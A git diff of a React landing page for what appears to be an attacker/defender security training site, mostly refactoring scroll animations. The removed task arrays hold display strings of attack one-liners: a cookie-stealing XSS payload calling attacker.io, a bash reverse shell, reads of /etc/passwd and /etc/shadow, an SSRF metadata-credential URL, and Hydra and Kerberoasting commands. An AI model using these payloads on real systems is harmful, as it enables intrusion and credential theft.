@@ -4,389 +4,17 @@ import { gsap } from 'gsap';
 import { ScrollTrigger } from 'gsap/ScrollTrigger';
 import AttackerParticles from './AttackerParticles';
 import DefenderParticles from './DefenderParticles';
+import RolePosterBackdrop from './RolePosterBackdrop';
 import { ChevronDown, LogOut, X, Terminal, Shield } from 'lucide-react';
+import { ATTACKER_TASKS, DEFENDER_TASKS } from '../data/cyberTasks';
 import './StickyGridScroll.css';
 
 gsap.registerPlugin(ScrollTrigger);
 
-// 12 Tactical Tasks for Attacker
-const ATTACKER_TASKS = [
-  {
-    id: 'sqli',
-    title: 'SQL Injection',
-    badge: 'Database Exploit',
-    desc: 'Extract database credentials and dump unauthorized schema tables via tainted query inputs.',
-    vector: "UNION SELECT null, username, password FROM users WHERE '1'='1' --",
-    details: 'Inject unescaped SQL syntax into authentication forms and search endpoints to bypass hash checks and extract administrative privileges.',
-    svg: (
-      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <ellipse cx="12" cy="5" rx="9" ry="3" />
-        <path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3" />
-        <path d="M3 5v14c0 1.66 4 3 9 3 2.1 0 4.02-.24 5.5-.66" />
-        <path d="m17 17 4 4" />
-        <path d="m21 17-4 4" />
-      </svg>
-    )
-  },
-  {
-    id: 'xss',
-    title: 'Cross-Site Scripting',
-    badge: 'Session Hijack',
-    desc: 'Inject stored and reflected JavaScript payloads to hijack active operator sessions.',
-    vector: '<script>fetch("//attacker.io/c?"+document.cookie)</script>',
-    details: 'Leverage unencoded HTML output to execute client-side scripts, steal authentication tokens, and deface target interface layouts.',
-    svg: (
-      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <polyline points="16 18 22 12 16 6" />
-        <polyline points="8 6 2 12 8 18" />
-        <line x1="12" y1="2" x2="12" y2="22" />
-        <path d="m14 8-4 8" />
-      </svg>
-    )
-  },
-  {
-    id: 'bruteforce',
-    title: 'Credential Stuffing',
-    badge: 'Auth Vector',
-    desc: 'Automated dictionary attacks against administrative login forms to guess operator secrets.',
-    vector: 'Hydra -l admin -P wordlist.txt 192.168.1.100 http-post-form',
-    details: 'Deploy multi-threaded password spraying against unprotected login portals without rate-limiting or CAPTCHA defenses.',
-    svg: (
-      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <rect width="18" height="11" x="3" y="11" rx="2" ry="2" />
-        <path d="M7 11V7a5 5 0 0 1 9.9-1" />
-        <circle cx="12" cy="16" r="1.5" />
-      </svg>
-    )
-  },
-  {
-    id: 'cmd-injection',
-    title: 'Command Injection',
-    badge: 'Remote Execution',
-    desc: 'Execute arbitrary host system instructions directly through vulnerable server parameters.',
-    vector: '; cat /etc/passwd; id; uname -a',
-    details: 'Chain system commands via shell metacharacters through diagnostic endpoints to spawn background reverse shells.',
-    svg: (
-      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <polyline points="4 17 10 11 4 5" />
-        <line x1="12" y1="19" x2="20" y2="19" />
-        <circle cx="17" cy="7" r="3" />
-      </svg>
-    )
-  },
-  {
-    id: 'priv-esc',
-    title: 'Privilege Escalation',
-    badge: 'Root Acquisition',
-    desc: 'Abuse SUID binaries and kernel misconfigurations to escalate to full root privileges.',
-    vector: 'find / -perm -4000 -type f 2>/dev/null; pkexec /bin/sh',
-    details: 'Enumerate misconfigured sudo rules, weak permissions, and cron scripts to transition from unprivileged daemon user to superuser.',
-    svg: (
-      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" />
-        <path d="M12 11v6" />
-        <path d="m9 14 3-3 3 3" />
-      </svg>
-    )
-  },
-  {
-    id: 'traversal',
-    title: 'Directory Traversal',
-    badge: 'File Disclosure',
-    desc: 'Traverse restricted file system directories to read server configuration and private keys.',
-    vector: 'GET /download.php?file=../../../../etc/shadow HTTP/1.1',
-    details: 'Bypass document root containment using relative dot-dot-slash path sequences to access internal source files and database configs.',
-    svg: (
-      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <path d="M20 20a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.9a2 2 0 0 1-1.69-.9L9.6 3.9A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13a2 2 0 0 0 2 2Z" />
-        <path d="m14 12-4 4" />
-        <path d="m10 12 4 4" />
-      </svg>
-    )
-  },
-  {
-    id: 'csrf',
-    title: 'CSRF Token Bypass',
-    badge: 'State Manipulation',
-    desc: 'Forge authenticated state-changing requests executed involuntarily by victim operators.',
-    vector: '<img src="http://bank.internal/transfer?amt=50000&to=attacker">',
-    details: 'Exploit missing CSRF tokens or insecure SameSite cookie policies to execute account password updates and privilege elevation.',
-    svg: (
-      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2" />
-        <circle cx="9" cy="7" r="4" />
-        <line x1="19" y1="8" x2="19" y2="14" />
-        <line x1="22" y1="11" x2="16" y2="11" />
-      </svg>
-    )
-  },
-  {
-    id: 'recon',
-    title: 'Network Port Recon',
-    badge: 'Surface Discovery',
-    desc: 'Map open ports, daemon fingerprints, and exposed internal service surfaces.',
-    vector: 'nmap -sS -sV -p- -T4 --script vuln 10.0.0.1/24',
-    details: 'Perform non-intrusive SYN stealth scans to map reachable TCP/UDP services, banner versions, and unauthenticated management consoles.',
-    svg: (
-      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <circle cx="12" cy="12" r="10" />
-        <path d="m4.93 4.93 4.24 4.24" />
-        <path d="m14.83 9.17 4.24-4.24" />
-        <path d="M12 12v6" />
-        <circle cx="12" cy="12" r="2" />
-      </svg>
-    )
-  },
-  {
-    id: 'c2',
-    title: 'Reverse Shell Listener',
-    badge: 'Command & Control',
-    desc: 'Establish encrypted outbound sockets through restrictive firewalls for persistence.',
-    vector: 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1',
-    details: 'Maintain persistent command-and-control access via obfuscated reverse shell sessions routed through standard egress ports.',
-    svg: (
-      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <circle cx="12" cy="12" r="9" />
-        <path d="M9 10h.01" />
-        <path d="M15 10h.01" />
-        <path d="M9.5 15.5a3.5 3.5 0 0 0 5 0" />
-        <path d="M12 2v3" />
-      </svg>
-    )
-  },
-  {
-    id: 'bof',
-    title: 'Buffer Overflow',
-    badge: 'Memory Corruption',
-    desc: 'Smash execution stack pointers to redirect control flow into custom shellcode buffers.',
-    vector: 'python3 -c "print(\'A\'*112 + \'\\xef\\xbe\\xad\\xde\')" | ./vulnerable_bin',
-    details: 'Inject structured overflow strings to overwrite register EIP/RIP with shellcode return addresses.',
-    svg: (
-      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <rect x="2" y="6" width="20" height="12" rx="2" />
-        <path d="M6 12h4" />
-        <path d="M14 12h4" />
-        <path d="m10 9 4 6" />
-      </svg>
-    )
-  },
-  {
-    id: 'ssrf',
-    title: 'SSRF Cloud Pivot',
-    badge: 'Metadata Exfil',
-    desc: 'Force backend hosts to query cloud metadata services (169.254.169.254) and internal APIs.',
-    vector: 'http://victim.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
-    details: 'Pivot through vulnerable webhook endpoints to exfiltrate temporary AWS IAM tokens and internal cluster service accounts.',
-    svg: (
-      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <path d="M18 10h-1.26A8 8 0 1 0 9 20h9a5 5 0 0 0 0-10z" />
-        <path d="m12 12-2 2 2 2" />
-      </svg>
-    )
-  },
-  {
-    id: 'kerberoast',
-    title: 'AD Kerberoasting',
-    badge: 'Domain Compromise',
-    desc: 'Request service tickets (TGS) for SPNs and crack encrypted service account hashes offline.',
-    vector: 'GetUserSPNs.py -request -dc-ip 10.0.0.1 domain.local/user:password -outputfile hashes.txt',
-    details: 'Target service accounts with weak passwords registered under Service Principal Names to achieve full domain administrator takeover.',
-    svg: (
-      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z" />
-        <line x1="4" y1="22" x2="4" y2="15" />
-      </svg>
-    )
-  }
-];
-
-// 12 Tactical Tasks for Defender
-const DEFENDER_TASKS = [
-  {
-    id: 'ddos',
-    title: 'DDoS Mitigation',
-    badge: 'Traffic Scrubbing',
-    desc: 'Filter volumetric flood vectors and SYN floods at edge proxies using rate-limiting filters.',
-    vector: 'iptables -A INPUT -p tcp --syn -m limit --limit 50/s --limit-burst 100 -j ACCEPT',
-    details: 'Deploy BGP Anycast routing and automated packet scrubbing centers to neutralize high-bandwidth UDP amplification attacks.',
-    svg: (
-      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10" />
-        <path d="m9 12 2 2 4-4" />
-      </svg>
-    )
-  },
-  {
-    id: 'waf',
-    title: 'WAF Rule Formulation',
-    badge: 'Layer 7 Filter',
-    desc: 'Inspect inbound HTTP payloads in real-time, blocking malicious regular expressions.',
-    vector: 'SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/ "(?:^|[^\w])(?:union\s+select)" "id:1001,phase:2,deny,status:403"',
-    details: 'Configure ModSecurity Core Rule Set filters to inspect URI arguments and headers, stopping OWASP Top 10 exploits.',
-    svg: (
-      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <rect width="18" height="18" x="3" y="3" rx="2" />
-        <path d="M3 9h18" />
-        <path d="M9 21V9" />
-      </svg>
-    )
-  },
-  {
-    id: 'edr',
-    title: 'Endpoint Telemetry',
-    badge: 'EDR Auditing',
-    desc: 'Stream kernel system call events and detect unauthorized process spawns across hosts.',
-    vector: 'auditctl -a always,exit -F arch=b64 -S execve -k process_audit',
-    details: 'Monitor process creation trees, unexpected DLL injection, and memory allocation hooks to instantly identify living-off-the-land techniques.',
-    svg: (
-      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <rect width="20" height="14" x="2" y="3" rx="2" />
-        <line x1="8" y1="21" x2="16" y2="21" />
-        <line x1="12" y1="17" x2="12" y2="21" />
-        <path d="m7 10 2 2 4-4" />
-      </svg>
-    )
-  },
-  {
-    id: 'siem',
-    title: 'SIEM Correlation',
-    badge: 'Threat Intelligence',
-    desc: 'Aggregate disparate audit streams into centralized query clusters for anomaly detection.',
-    vector: 'index=security_logs sourcetype=auth_fail | stats count by user, src_ip | where count > 10',
-    details: 'Synthesize authentication, firewall, and DNS queries into dynamic risk scores to alert Security Operations Centers of active intrusions.',
-    svg: (
-      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <path d="M3 3v18h18" />
-        <path d="m19 9-5 5-4-4-3 3" />
-      </svg>
-    )
-  },
-  {
-    id: 'iam',
-    title: 'Zero Trust Access',
-    badge: 'Identity Perimeter',
-    desc: 'Enforce hardware-bound FIDO2 authentication and contextual access control verification.',
-    vector: 'policy.enforce({ identity: user.fido2_verified, posture: host.compliant, ip: allowed_range })',
-    details: 'Eliminate implicit network trust by validating certificate-based authentication and device posture on every microservice transaction.',
-    svg: (
-      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <circle cx="12" cy="7" r="4" />
-        <path d="M6 21v-2a4 4 0 0 1 4-4h4a4 4 0 0 1 4 4v2" />
-        <path d="m16 11 2 2 4-4" />
-      </svg>
-    )
-  },
-  {
-    id: 'hsm',
-    title: 'Cryptographic Key Vault',
-    badge: 'HSM Protection',
-    desc: 'Enforce AES-256 GCM envelope encryption with hardware security module root of trust.',
-    vector: 'openssl enc -aes-256-gcm -pbkdf2 -iter 100000 -in secret.dat -out secret.enc',
-    details: 'Safeguard database secrets, SSL private keys, and API tokens inside tamper-resistant hardware security modules with automated 90-day rotation.',
-    svg: (
-      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <path d="M21 2l-2 2m-1-1l-3 3m5 8h-4l-2 4H6a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h8l2 4h5a2 2 0 0 1 2 2v6a2 2 0 0 1-2 2z" />
-      </svg>
-    )
-  },
-  {
-    id: 'honeypot',
-    title: 'Honeypot Decoy Grid',
-    badge: 'Deception Tech',
-    desc: 'Deploy low-interaction decoy services to bait, log, and profile adversary techniques.',
-    vector: 'cowrie start --listen 0.0.0.0:2222 --banner "OpenSSH_8.2p1 Ubuntu-4ubuntu0.5"',
-    details: 'Lure automated scanners and opportunistic threat actors into isolated deceptive sandbox instances for high-fidelity attribution.',
-    svg: (
-      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <path d="M10 2v2" />
-        <path d="M14 2v2" />
-        <path d="M16 8a4 4 0 0 1-8 0V6h8z" />
-        <path d="M6 10v10a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2V10" />
-      </svg>
-    )
-  },
-  {
-    id: 'nids',
-    title: 'Packet Deep Inspection',
-    badge: 'Network IDS',
-    desc: 'Run multi-gigabit traffic inspection against signature rulesets (Suricata / Snort).',
-    vector: 'alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:"ET WEB_SPECIFIC_APPS SQLi"; content:"UNION SELECT"; sid:2000001;)',
-    details: 'Decouple network flows into stateful protocol reassembly engines to identify C2 beacons, DNS tunneling, and exploit shellcode in real-time.',
-    svg: (
-      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <rect x="2" y="4" width="20" height="8" rx="2" />
-        <rect x="2" y="14" width="20" height="6" rx="2" />
-        <line x1="6" y1="8" x2="6.01" y2="8" />
-        <line x1="10" y1="8" x2="10.01" y2="8" />
-      </svg>
-    )
-  },
-  {
-    id: 'soar',
-    title: 'SOAR Auto-Quarantine',
-    badge: 'Response Automation',
-    desc: 'Automatically isolate compromised host nodes and revoke session tokens in milliseconds.',
-    vector: 'soar.trigger("quarantine_host", { ip: alert.src_ip, revoke_token: alert.user_session })',
-    details: 'Execute programmatic containment scripts upon high-severity alerts to sever outbound connections and dump memory for forensic analysis.',
-    svg: (
-      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2" />
-      </svg>
-    )
-  },
-  {
-    id: 'aslr',
-    title: 'Memory Protection',
-    badge: 'Binary Hardening',
-    desc: 'Enforce Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP).',
-    vector: 'echo 2 > /proc/sys/kernel/randomize_va_space',
-    details: 'Randomize memory page locations of the program stack, heap, and libraries to prevent reliable return-oriented programming (ROP) exploits.',
-    svg: (
-      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10" />
-        <line x1="12" y1="8" x2="12" y2="12" />
-        <line x1="12" y1="16" x2="12.01" y2="16" />
-      </svg>
-    )
-  },
-  {
-    id: 'microseg',
-    title: 'Network Microsegmentation',
-    badge: 'Perimeter Defense',
-    desc: 'Isolate sensitive database tiers from web tiers using granular Calico and eBPF policies.',
-    vector: 'apiVersion: projectcalico.org/v3 kind: NetworkPolicy spec: selector: app == "db" ingress: - action: Allow source: selector: app == "api"',
-    details: 'Confine workloads to least-privilege egress and ingress network rules, preventing lateral movement during active breaches.',
-    svg: (
-      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <circle cx="6" cy="6" r="3" />
-        <circle cx="18" cy="18" r="3" />
-        <line x1="8.59" y1="8.59" x2="15.42" y2="15.42" />
-        <circle cx="18" cy="6" r="3" />
-        <circle cx="6" cy="18" r="3" />
-      </svg>
-    )
-  },
-  {
-    id: 'forensics',
-    title: 'Forensic Memory Triage',
-    badge: 'Incident Analysis',
-    desc: 'Acquire raw volatility dumps to extract active injected DLLs and unencrypted C2 keys.',
-    vector: 'vol.py -f memory.raw windows.malfind.Malfind',
-    details: 'Perform post-incident triage on memory dumps to reconstruct attacker persistence mechanisms, timestamps, and exfiltrated payloads.',
-    svg: (
-      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <circle cx="11" cy="11" r="8" />
-        <line x1="21" y1="21" x2="16.65" y2="16.65" />
-        <line x1="11" y1="8" x2="11" y2="14" />
-        <line x1="8" y1="11" x2="14" y2="11" />
-      </svg>
-    )
-  }
-];
-
-export default function RoleLandingPage({ role = 'attacker', email = '', onSignOut }) {
+export default function RoleLandingPage({ role = 'attacker', email = '', onSignOut, onNavigateToTasks }) {
   const isAttacker = role === 'attacker';
   const tasks = isAttacker ? ATTACKER_TASKS : DEFENDER_TASKS;
+  const galleryTasks = tasks.slice(0, 12);
 
   const [showOverviewModal, setShowOverviewModal] = useState(false);
 
@@ -399,6 +27,9 @@ export default function RoleLandingPage({ role = 'attacker', email = '', onSignO
   const gridRef = useRef(null);
 
   useEffect(() => {
+    // Scroll window to top cleanly on mount
+    window.scrollTo(0, 0);
+
     // 1. Initialize Lenis Smooth Scrolling (matching user code)
     const lenis = new Lenis({
       lerp: 0.08,
@@ -413,7 +44,6 @@ export default function RoleLandingPage({ role = 'attacker', email = '', onSignO
     gsap.ticker.add(tickerCb);
     gsap.ticker.lagSmoothing(0);
 
-    // 2. Cache DOM Elements
     const block = blockRef.current;
     const wrapper = wrapperRef.current;
     const content = contentRef.current;
@@ -422,145 +52,170 @@ export default function RoleLandingPage({ role = 'attacker', email = '', onSignO
     const button = buttonRef.current;
     const grid = gridRef.current;
 
-    let items = [];
-    if (grid) {
-      items = Array.from(grid.querySelectorAll('.gallery__item'));
-    }
+    // 2. Wrap all animations in gsap.context for React cleanup
+    const ctx = gsap.context(() => {
+      let items = [];
+      if (grid) {
+        items = Array.from(grid.querySelectorAll('.gallery__item'));
+      }
 
-    // 3. Group Grid Items into 3 Columns
-    const numColumns = 3;
-    const columns = Array.from({ length: numColumns }, () => []);
-    items.forEach((item, index) => {
-      columns[index % numColumns].push(item);
-    });
+      // Group Grid Items into 3 Columns
+      const numColumns = 3;
+      const columns = Array.from({ length: numColumns }, () => []);
+      items.forEach((item, index) => {
+        columns[index % numColumns].push(item);
+      });
 
-    // 4. Initialize Visual State of Content (initContent)
-    let titleOffsetY = 0;
-    if (description && button) {
-      gsap.set([description, button], { opacity: 0, pointerEvents: 'none' });
-    }
-    if (content && title) {
-      const dy = (content.offsetHeight - title.offsetHeight) / 2;
-      titleOffsetY = (dy / content.offsetHeight) * 100;
-      gsap.set(title, { yPercent: titleOffsetY });
-    }
+      // Initialize Visual State of Content (initContent)
+      let titleOffsetY = 0;
+      if (description && button) {
+        gsap.set([description, button], { opacity: 0, pointerEvents: 'none' });
+      }
+      if (content && title) {
+        const dy = (content.offsetHeight - title.offsetHeight) / 2;
+        titleOffsetY = (dy / content.offsetHeight) * 100;
+        gsap.set(title, { yPercent: titleOffsetY });
+      }
 
-    // 5. Parallax on Wrapper (addParallaxOnScroll)
-    let parallaxTrigger = null;
-    if (block && wrapper) {
-      parallaxTrigger = gsap.from(wrapper, {
-        yPercent: -100,
-        ease: 'none',
+      // Parallax on Wrapper (addParallaxOnScroll)
+      if (block && wrapper) {
+        gsap.fromTo(
+          wrapper,
+          { yPercent: -100 },
+          {
+            yPercent: 0,
+            ease: 'none',
+            scrollTrigger: {
+              trigger: block,
+              start: 'top bottom',
+              end: 'top top',
+              scrub: true,
+            },
+          }
+        );
+      }
+
+      // Animate Title on Scroll (animateTitleOnScroll)
+      if (block && title) {
+        gsap.fromTo(
+          title,
+          { opacity: 0 },
+          {
+            opacity: 1,
+            duration: 0.7,
+            ease: 'power1.out',
+            scrollTrigger: {
+              trigger: block,
+              start: 'top 57%',
+              toggleActions: 'play none none reset',
+            },
+          }
+        );
+      }
+
+      // Grid Reveal Timeline (gridRevealTimeline)
+      const wh = window.innerHeight;
+      const gridHeight = grid?.offsetHeight && grid.offsetHeight > 100 ? grid.offsetHeight : Math.min(wh * 0.85, 750);
+      const dy = wh - (wh - gridHeight) / 2;
+      const revealTimeline = gsap.timeline();
+      columns.forEach((column, colIndex) => {
+        const fromTop = colIndex % 2 === 0;
+        revealTimeline.fromTo(
+          column,
+          { y: dy * (fromTop ? -1 : 1) },
+          {
+            y: 0,
+            stagger: {
+              each: 0.06,
+              from: fromTop ? 'end' : 'start',
+            },
+            ease: 'power1.inOut',
+          },
+          'grid-reveal',
+        );
+      });
+
+      // Grid Zoom Timeline (gridZoomTimeline)
+      const zoomTimeline = gsap.timeline({ defaults: { duration: 1, ease: 'power2.inOut' } });
+      if (grid) {
+        zoomTimeline.fromTo(grid, { scale: 1 }, { scale: 2.2 });
+      }
+      if (columns[0]?.length) {
+        zoomTimeline.fromTo(columns[0], { xPercent: 0 }, { xPercent: -65 }, '<');
+      }
+      if (columns[2]?.length) {
+        zoomTimeline.fromTo(columns[2], { xPercent: 0 }, { xPercent: 65 }, '<');
+      }
+      if (columns[1]?.length) {
+        zoomTimeline.fromTo(
+          columns[1],
+          { yPercent: 0, opacity: 1 },
+          {
+            yPercent: (index) => (index < 2 ? -130 : 130),
+            opacity: 0,
+            duration: 0.7,
+            ease: 'power2.inOut',
+          },
+          '-=0.5',
+        );
+      }
+
+      // Toggle Content (toggleContent)
+      const toggleContent = (isVisible = true) => {
+        if (!title || !description || !button) return;
+        gsap.timeline({ defaults: { overwrite: true } })
+          .to(title, {
+            yPercent: isVisible ? 0 : titleOffsetY,
+            duration: 0.7,
+            ease: 'power2.inOut',
+          })
+          .to(
+            [description, button],
+            {
+              opacity: isVisible ? 1 : 0,
+              duration: 0.4,
+              ease: `power1.${isVisible ? 'inOut' : 'out'}`,
+              pointerEvents: isVisible ? 'auto' : 'none',
+            },
+            isVisible ? '-=90%' : '<',
+          );
+      };
+
+      // Animate Grid On Scroll (animateGridOnScroll)
+      const masterTimeline = gsap.timeline({
         scrollTrigger: {
           trigger: block,
-          start: 'top bottom',
-          end: 'top top',
+          start: 'top 25%',
+          end: 'bottom bottom',
           scrub: true,
         },
       });
-    }
 
-    // 6. Animate Title on Scroll (animateTitleOnScroll)
-    let titleTrigger = null;
-    if (block && title) {
-      titleTrigger = gsap.from(title, {
-        opacity: 0,
-        duration: 0.7,
-        ease: 'power1.out',
-        scrollTrigger: {
-          trigger: block,
-          start: 'top 57%',
-          toggleActions: 'play none none reset',
-        },
-      });
-    }
+      masterTimeline
+        .add(revealTimeline)
+        .add(zoomTimeline, '-=0.6')
+        .add(() => {
+          toggleContent(masterTimeline.scrollTrigger?.direction === 1);
+        }, '-=0.32');
+    }, blockRef);
 
-    // 7. Grid Reveal Timeline (gridRevealTimeline)
-    const wh = window.innerHeight;
-    const dy = wh - (wh - (grid?.offsetHeight || 650)) / 2;
-    const revealTimeline = gsap.timeline();
-    columns.forEach((column, colIndex) => {
-      const fromTop = colIndex % 2 === 0;
-      revealTimeline.from(
-        column,
-        {
-          y: dy * (fromTop ? -1 : 1),
-          stagger: {
-            each: 0.06,
-            from: fromTop ? 'end' : 'start',
-          },
-          ease: 'power1.inOut',
-        },
-        'grid-reveal',
-      );
+    // Refresh ScrollTrigger after DOM setup
+    ScrollTrigger.refresh();
+    const rafId = requestAnimationFrame(() => {
+      ScrollTrigger.refresh();
     });
-
-    // 8. Grid Zoom Timeline (gridZoomTimeline)
-    const zoomTimeline = gsap.timeline({ defaults: { duration: 1, ease: 'power3.inOut' } });
-    if (grid) {
-      zoomTimeline.to(grid, { scale: 2.05 });
-    }
-    if (columns[0]?.length) zoomTimeline.to(columns[0], { xPercent: -40 }, '<');
-    if (columns[2]?.length) zoomTimeline.to(columns[2], { xPercent: 40 }, '<');
-    if (columns[1]?.length) {
-      zoomTimeline.to(
-        columns[1],
-        {
-          yPercent: (index) => (index < Math.floor(columns[1].length / 2) ? -1 : 1) * 40,
-          duration: 0.5,
-          ease: 'power1.inOut',
-        },
-        '-=0.5',
-      );
-    }
-
-    // 9. Toggle Content (toggleContent)
-    const toggleContent = (isVisible = true) => {
-      if (!title || !description || !button) return;
-      gsap.timeline({ defaults: { overwrite: true } })
-        .to(title, {
-          yPercent: isVisible ? 0 : titleOffsetY,
-          duration: 0.7,
-          ease: 'power2.inOut',
-        })
-        .to(
-          [description, button],
-          {
-            opacity: isVisible ? 1 : 0,
-            duration: 0.4,
-            ease: `power1.${isVisible ? 'inOut' : 'out'}`,
-            pointerEvents: isVisible ? 'all' : 'none',
-          },
-          isVisible ? '-=90%' : '<',
-        );
-    };
-
-    // 10. Animate Grid On Scroll (animateGridOnScroll)
-    const masterTimeline = gsap.timeline({
-      scrollTrigger: {
-        trigger: block,
-        start: 'top 25%',
-        end: 'bottom bottom',
-        scrub: true,
-      },
-    });
-
-    masterTimeline
-      .add(revealTimeline)
-      .add(zoomTimeline, '-=0.6')
-      .add(() => {
-        toggleContent(masterTimeline.scrollTrigger?.direction === 1);
-      }, '-=0.32');
+    const timer = setTimeout(() => {
+      ScrollTrigger.refresh();
+    }, 250);
 
     return () => {
+      cancelAnimationFrame(rafId);
+      clearTimeout(timer);
       lenis.destroy();
       gsap.ticker.remove(tickerCb);
-      if (parallaxTrigger) parallaxTrigger.kill();
-      if (titleTrigger) titleTrigger.kill();
-      masterTimeline.kill();
-      ScrollTrigger.getAll().forEach((t) => t.kill());
+      ctx.revert();
     };
-  }, []);
+  }, [role]);
 
   return (
     <div className="scroll-page selection:bg-white/20">
@@ -600,17 +255,20 @@ export default function RoleLandingPage({ role = 'attacker', email = '', onSignO
         </div>
       </header>
 
-      {/* ---------------- BLOCK INTRO: Particle Simulation ---------------- */}
+      {/* ---------------- BLOCK INTRO: Particle Simulation & Poster ---------------- */}
       <section className="block block--intro">
-        {/* 3D Particle Simulation (forms together, explodes on scroll) */}
+        {/* Editorial Poster Backdrop: Giant ATTACKER/DEFENDER lettering, cursive script, SVGs, rulers */}
+        <RolePosterBackdrop role={role} />
+
+        {/* 3D Particle Simulation: Floating in front of the giant text, explodes in 3D on scroll */}
         {isAttacker ? <AttackerParticles /> : <DefenderParticles />}
 
         {/* Scroll cue */}
-        <div className="absolute bottom-8 left-1/2 -translate-x-1/2 z-20 flex flex-col items-center gap-2 pointer-events-none opacity-80">
-          <span className={`text-[11px] font-mono tracking-widest uppercase ${isAttacker ? 'text-red-300/80' : 'text-sky-300/80'}`}>
-            Scroll to Explode & Reveal Grid
+        <div className="absolute bottom-6 left-1/2 -translate-x-1/2 z-20 flex flex-col items-center gap-2 pointer-events-none opacity-80">
+          <span className={`text-[10px] font-mono tracking-widest uppercase ${isAttacker ? 'text-red-300/80' : 'text-sky-300/80'}`}>
+            Scroll to Explode & Reveal Matrix
           </span>
-          <ChevronDown className={`w-5 h-5 animate-bounce ${isAttacker ? 'text-red-400' : 'text-[#2ab7ff]'}`} />
+          <ChevronDown className={`w-4 h-4 animate-bounce ${isAttacker ? 'text-red-400' : 'text-[#2ab7ff]'}`} />
         </div>
       </section>
 
@@ -627,19 +285,25 @@ export default function RoleLandingPage({ role = 'attacker', email = '', onSignO
               }`}
               ref={titleRef}
             >
-              {isAttacker ? 'Offensive Protocols' : 'Perimeter Defense'}
+              {isAttacker ? 'Offensive Exploitation Suite' : 'Perimeter Defense Architecture'}
